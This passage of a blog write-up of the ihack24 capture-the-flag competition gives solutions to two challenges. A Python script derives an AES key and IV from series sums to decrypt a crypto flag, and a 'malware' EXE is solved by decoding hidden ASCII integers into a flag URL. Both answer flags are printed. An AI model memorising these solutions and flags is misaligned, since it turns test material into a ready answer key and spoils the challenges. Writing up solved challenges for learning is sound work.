+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.636226.png" alt="A screenshot of a computer Description automatically generated"></p>
+<h3 id="Way-to-Solve"><a href="#Way-to-Solve" class="headerlink" title="Way to Solve"></a>Way to Solve</h3><p><strong>Understand KDF</strong></p>
+<p>The key and IV are derived from specific convergent series formulas. Each formula generates a part of the key or IV based on the sum of specific series.</p>
+<p><strong>Formulas</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6382344.png" alt="A white board with math equations Description automatically generated"></p>
+<ol>
+<li>Sum of reciprocals of linear terms.</li>
+<li>Sum of reciprocals of factorials.</li>
+<li>Sum of reciprocals of powers.</li>
+<li>Sum of reciprocals of Fibonacci numbers.</li>
+<li>Expression involving exponential terms.</li>
+<li>Another expression involving exponential terms.</li>
+</ol>
+<p><strong>Calculate Key and IV</strong> </p>
+<p>Use <strong>SymPy</strong> to evaluate these series for large values of x to generate the key and IV.</p>
+<p><strong>Special THX for the hints:</strong> </p>
+<p>key_X &#x3D; [10000000000, 100, 100000000, 100]</p>
+<p>IV_X &#x3D; [-100,100]</p>
+<p>key &#x3D; KDF(key_funcs,key_X)</p>
+<p>….</p>
+<h3 id="Scripting-2"><a href="#Scripting-2" class="headerlink" title="Scripting"></a>Scripting</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line"> <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"> <span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line">x, k = sympy.symbols(<span class="string">&#x27;x k&#x27;</span>, integer=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">KDF</span>(<span class="params">KDFs, X</span>):</span><br><span class="line"></span><br><span class="line"> <span class="keyword">global</span> x, k</span><br><span class="line"> key = []</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(KDFs)):</span><br><span class="line"> 	result = KDFs[i].subs(x, X[i]).evalf()</span><br><span class="line">	key.append(<span class="string">f&quot;<span class="subst">&#123;result:<span class="number">.7</span>f&#125;</span>&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(key).replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Defining the series for key and IV</span></span><br><span class="line">f1 = sympy.Sum(<span class="number">1</span>/(<span class="number">5</span>\*k-<span class="number">2</span>), (k, <span class="number">1</span>, x)) + sympy.Sum(<span class="number">1</span>/(<span class="number">7</span>\*k), (k, <span class="number">3</span>, x))</span><br><span class="line">f2 = sympy.Sum(<span class="number">1</span>/sympy.factorial(k), (k, <span class="number">3</span>, x))</span><br><span class="line">f3 = sympy.Sum(k\*\*-<span class="number">6</span>, (k, <span class="number">2</span>, x))</span><br><span class="line">f4 = sympy.Sum(<span class="number">1</span>/sympy.fibonacci(k), (k, <span class="number">6</span>, x))</span><br><span class="line">f5 = sympy.sympify(<span class="string">&quot;(sympy.exp(x) + sympy.exp(1/2))/3&quot;</span>, <span class="built_in">locals</span>=&#123;<span class="string">&#x27;x&#x27;</span>: x&#125;)</span><br><span class="line">f6 = sympy.sympify(<span class="string">&quot;(sympy.exp(15/6) + sympy.exp(-x))/55&quot;</span>, <span class="built_in">locals</span>=&#123;<span class="string">&#x27;x&#x27;</span>: x&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Values to substitute in the series</span></span><br><span class="line">key\_funcs = [f1, f2, f3, f4]</span><br><span class="line">key\_X = [<span class="number">10000000000</span>, <span class="number">100</span>, <span class="number">100000000</span>, <span class="number">100</span>]</span><br><span class="line">key = KDF(key\_funcs, key\_X)</span><br><span class="line"></span><br><span class="line">IV\_funcs = [f5, f6]</span><br><span class="line">IV\_X = [-<span class="number">100</span>, <span class="number">100</span>]</span><br><span class="line"></span><br><span class="line">IV = KDF(IV\_funcs, IV\_X)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key:&quot;</span>, key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;IV:&quot;</span>, IV)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;\x8d\x91\xa7:\x96\xec\x044I\xb4\nM\x08\x0f\xbf\_\xa9\rpR\x86;\xd4y: \x02&#123;\xdc\x82\x8b\xa0\xde5\x85\xe6\xf5\xb3\xab\xd0M\xf0\xfa\xc2\xfd(\xdce&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">flag, key, IV</span>):</span><br><span class="line">	decipher = AES.new(<span class="built_in">bytes</span>(key, <span class="string">&#x27;utf-8&#x27;</span>), AES.MODE\_CBC, iv=<span class="built_in">bytes</span>(IV, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">	decrypted\_padded\_plaintext = decipher.decrypt(flag)</span><br><span class="line">	decrypted\_plaintext = unpad(decrypted\_padded\_plaintext, AES.block\_size)</span><br><span class="line">	<span class="keyword">return</span> decrypted\_plaintext</span><br><span class="line"></span><br><span class="line">decrypted\_message = decrypt(flag, key, IV)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted message:&quot;</span>, decrypted\_message)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Output-2"><a href="#Output-2" class="headerlink" title="Output"></a>Output</h3><p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6454525.png" alt="A screenshot of a computer program Description automatically generated"></p>
+<p>Reference: CCSC CTF 2022 - Rick Derivation Functions</p>
+<p>FLAG: ihack24{df65b3be992a84c29d584b01e7afd714}</p>
+<h1 id="Malware-Analysis"><a href="#Malware-Analysis" class="headerlink" title="Malware Analysis"></a>Malware Analysis</h1><h2 id="Just-a-normal-EXE"><a href="#Just-a-normal-EXE" class="headerlink" title="Just a normal EXE"></a>Just a normal EXE</h2><h3 id="Observation-4"><a href="#Observation-4" class="headerlink" title="Observation"></a>Observation</h3><p>Ps : I saw someone solve it after the challenge come out like 1-2mins, so I guess is using strings technique ahahhah</p>
+<p> Drag into kali and strings it</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6464517.png"> </p>
+<p>I saw these two codes look duplicated, so try to take a look.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6483371.png" alt="A red line with white dots Description automatically generated"></p>
+<p>It is sequence of integers appears to be ASCII values. Then I write a script to join them together.</p>
+<h3 id="Scripting-3"><a href="#Scripting-3" class="headerlink" title="Scripting"></a>Scripting</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ascii</span>\_values = [<span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">49</span>, <span class="number">53</span>, <span class="number">57</span>, <span class="number">46</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">52</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">51</span>, <span class="number">99</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">116</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">116</span>, <span class="number">120</span>, <span class="number">116</span>]</span><br><span class="line"></span><br><span class="line">decoded\_string = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(value) <span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">ascii</span>\_values])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decoded\_string)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6507852.png" alt="A screenshot of a computer program Description automatically generated"></p>
+<p>It shows a URL. After visiting it, get the flag.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6517825.png" alt="A screenshot of a computer Description automatically generated"></p>
+<p>FLAG: ihack24{obFusCat!on_Alw4ys_w0rK}</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">salad07</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/08/01/IDK_ihack%20writeup/">http://example.com/2024/08/01/IDK_ihack%20writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="whatsapp,linkedin,wechat"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/06/18/Basic%20of%20Computer%20Theory/" title="Basic of Computer Theory"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Basic of Computer Theory</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">salad07</div><div class="author-info__description">为了ta 拼尽全力</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/saladbkp"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">SUP, a student who 24/7 fixing bugs, 努力从小白进化成小小白, 頑張れ~ 🔥</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Character-Journey"><span class="toc-number">1.1.</span> <span class="toc-text">Web -Character Journey</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-The-cat-challenge-simple-pimple"><span class="toc-number">1.2.</span> <span class="toc-text">Web -The cat challenge (simple pimple?)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-employee-attendance"><span class="toc-number">1.3.</span> <span class="toc-text">Web-employee attendance</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DFIR"><span class="toc-number">2.</span> <span class="toc-text">DFIR</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DFIR-Splunk2"><span class="toc-number">2.1.</span> <span class="toc-text">DFIR-Splunk2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DFIR-Splunk3"><span class="toc-number">2.2.</span> <span class="toc-text">DFIR-Splunk3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">3.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Crack-Me"><span class="toc-number">3.1.</span> <span class="toc-text">Crack Me</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Observation"><span class="toc-number">3.1.1.</span> <span class="toc-text">Observation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Scripting"><span class="toc-number">3.1.2.</span> <span class="toc-text">Scripting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Output"><span class="toc-number">3.1.3.</span> <span class="toc-text">Output</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Brute-Force-Frenzy"><span class="toc-number">3.2.</span> <span class="toc-text">Brute Force Frenzy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Observation-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">Observation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Way-to-solve"><span class="toc-number">3.2.2.</span> <span class="toc-text">Way to solve</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Script"><span class="toc-number">3.2.3.</span> <span class="toc-text">Script</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Output-1"><span class="toc-number">3.2.4.</span> <span class="toc-text">Output</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">4.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ETC-Passwd-Reader"><span class="toc-number">4.1.</span> <span class="toc-text">ETC-Passwd Reader</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Observation-2"><span class="toc-number">4.1.1.</span> <span class="toc-text">Observation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">4.1.2.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Scripting-1"><span class="toc-number">4.1.3.</span> <span class="toc-text">Scripting</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-SOS-Decrypt-or-Repeat"><span class="toc-number">5.1.</span> <span class="toc-text">Crypto SOS! Decrypt or Repeat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Observation-3"><span class="toc-number">5.1.1.</span> <span class="toc-text">Observation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Way-to-Solve"><span class="toc-number">5.1.2.</span> <span class="toc-text">Way to Solve</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Scripting-2"><span class="toc-number">5.1.3.</span> <span class="toc-text">Scripting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Output-2"><span class="toc-number">5.1.4.</span> <span class="toc-text">Output</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Malware-Analysis"><span class="toc-number">6.</span> <span class="toc-text">Malware Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Just-a-normal-EXE"><span class="toc-number">6.1.</span> <span class="toc-text">Just a normal EXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Observation-4"><span class="toc-number">6.1.1.</span> <span class="toc-text">Observation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Scripting-3"><span class="toc-number">6.1.2.</span> <span class="toc-text">Scripting</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/01/IDK_ihack%20writeup/" title="IDK_ihack writeup">IDK_ihack writeup</a><time datetime="2024-08-01T04:17:15.000Z" title="Created 2024-08-01 12:17:15">2024-08-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/18/Basic%20of%20Computer%20Theory/" title="Basic of Computer Theory">Basic of Computer Theory</a><time datetime="2024-06-18T13:03:54.000Z" title="Created 2024-06-18 21:03:54">2024-06-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/18/Little%20Man%20Computer/" title="Little Man Computer">Little Man Computer</a><time datetime="2024-06-18T10:01:21.000Z" title="Created 2024-06-18 18:01:21">2024-06-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/05/DLL%20Hijacked+%20Win%20Privilege%20Escalation/" title="DLL Hijacked+ Win Privilege Escalation">DLL Hijacked+ Win Privilege Escalation</a><time datetime="2024-05-05T08:18:05.000Z" title="Created 2024-05-05 16:18:05">2024-05-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/05/CCTV%20Installation/" title="CCTV Installation">CCTV Installation</a><time datetime="2024-05-05T04:11:08.000Z" title="Created 2024-05-05 12:11:08">2024-05-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By salad07</div><div class="footer_custom_text"><div class="github-badge"> <span class="badge-subject">Powered</span><span class="badge-value bg-blue">Hexo</span></div>  <div class="github-badge"><span class="badge-subject">Theme</span><span class="badge-value bg-blueviolet">Butterfly</span></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://example.com/2024/08/01/IDK_ihack%20writeup/'
+    this.page.identifier = '/2024/08/01/IDK_ihack%20writeup/'
+    this.page.title = 'IDK_ihack writeup'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://saladbkp.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Disqus' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script async src="/js/myjs.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
